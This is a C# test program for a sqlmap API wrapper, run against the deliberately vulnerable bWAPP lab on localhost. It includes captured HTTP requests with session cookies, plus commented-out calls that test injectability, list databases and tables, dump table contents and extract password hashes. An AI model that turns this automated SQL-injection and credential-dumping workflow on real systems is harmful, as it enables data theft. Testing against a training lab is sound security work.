using System;
using System.Linq;
using System.Threading.Tasks;
using SqlMapAPIWrapperLib;

namespace SqlMapAPIWrapper
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string data = @"POST /sqli_6.php HTTP/1.1
Host: localhost
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/sqli_6.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: security_level=0; PHPSESSID=gj4a6vjrbpqc3imapg492b7el0
Connection: close

title=test&action=search";

            string dataNotWorking = @"POST /sqli_6.php HTTP/1.1
Host: localhost
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/sqli_6.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: security_level=0; PHPSESSID=5pdj4a7fk5vj1amju59piiht51
Connection: close
";

            
            string spreadhseet = @"POST /api/service/register HTTP/1.1
Host: localhost
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{""Username"":""test"",""Password"":""test""}";



            SqlMapApiWrapper wrapper = new SqlMapApiWrapper("127.0.0.1", 8775);
            bool inject =await  wrapper.IsSqlinjectable("localhost/sqli_1.php?title=test","security_level=0; PHPSESSID=gj4a6vjrbpqc3imapg492b7el0");
            /*
string targetUrl = "http://localhost/sqli_1.php?title=test";
string targetUrlNotWorking = "http://localhost/sqli_1.php";
string sessionCookie = "security_level=0; PHPSESSID=5pdj4a7fk5vj1amju59piiht51";
string db = "bWAPP";
string table = "users";

//One Task at a time otherwise bWAPP gets DOSed
var injectable =  await wrapper.IsSqlinjectable(targetUrl, sessionCookie);
var injectable2 = await wrapper.IsSqlinjectable(data);
var injectable3 = await wrapper.IsSqlinjectable(targetUrlNotWorking,sessionCookie);
var injectable4 =  await wrapper.IsSqlinjectable(dataNotWorking);
var dbs =  await wrapper.GetDatabases(targetUrl, sessionCookie);
var dbs2 =  await wrapper.GetDatabases(data);
var dbs3 =  await wrapper.GetDatabases(targetUrlNotWorking, sessionCookie);
var dbs4 =  await wrapper.GetDatabases(dataNotWorking);
var tables =  await wrapper.GetDatabaseTables(targetUrl, sessionCookie, db);
var tables2 =  await wrapper.GetDatabaseTables(data, db);
var tables3 =  await wrapper.GetDatabaseTables(targetUrlNotWorking, sessionCookie, db);
var tables4 =  await wrapper.GetDatabaseTables(dataNotWorking, db);
var tableContent =  await wrapper.GetTableContentFromDatabase(targetUrl, sessionCookie, table, db);
var tableContent2 =  await wrapper.GetTableContentFromDatabase(data, table, db);
var tableContent3 =  await wrapper.GetTableContentFromDatabase(targetUrlNotWorking, sessionCookie, table, db);
var tableContent4 =  await wrapper.GetTableContentFromDatabase(dataNotWorking, table, db);
var dbType = await wrapper.GetDatabaseType(targetUrl, sessionCookie);
var dbType2 =  await wrapper.GetDatabaseType(data);
var dbType3 =  await wrapper.GetDatabaseType(targetUrlNotWorking, sessionCookie);
var dbType4 =  await wrapper.GetDatabaseType(dataNotWorking);
var passwords =  await wrapper.GetDatabasePasswords(targetUrl, sessionCookie);
var passwords2 =  await wrapper.GetDatabasePasswords(data);
var passwords3 =  await wrapper.GetDatabasePasswords(targetUrlNotWorking, sessionCookie);
var passwords4 =  await wrapper.GetDatabasePasswords(dataNotWorking);

bool working = false;

bool binjectable = injectable && injectable2;
bool bdbs = dbs.SequenceEqual(dbs2);
tables.Sort();
tables2.Sort();
bool btables = tables.SequenceEqual(tables2);
bool btableContent = tableContent.Count == tableContent2.Count;
bool bdbType = dbType.Name == dbType2.Name;
bool bpasswords = passwords.SequenceEqual(passwords2); 

bool binjectable2 = !(injectable3 && injectable4);
bool bdbs2 = dbs3 == dbs4;
bool btables2 = tables3 == tables4;
bool btableContent2 = tableContent3 == tableContent4;
bool bdbType2 = dbType3 == dbType4;
bool bpasswords2 = passwords3 == passwords4;

if ( binjectable && bdbs  &&  btables && btableContent && bdbType && bpasswords
    && binjectable2 && bdbs2  &&  btables2 && btableContent2 && bdbType2 && bpasswords2)
    working = true;

Console.WriteLine($"Working: {working}");
/*
int i = 0;
while (true)
{
    try
    {
       SqlmapSession session = new SqlmapSession("127.0.0.1");
       string resp = await session.ExecuteGet("/task/new");
       //Console.WriteLine(resp);
       //System.Threading.Thread.Sleep(new TimeSpan(0,0,1));
    }
    catch (Exception e)
    {
        Console.WriteLine(i);
        throw ;
    }
} */
        }
    }
}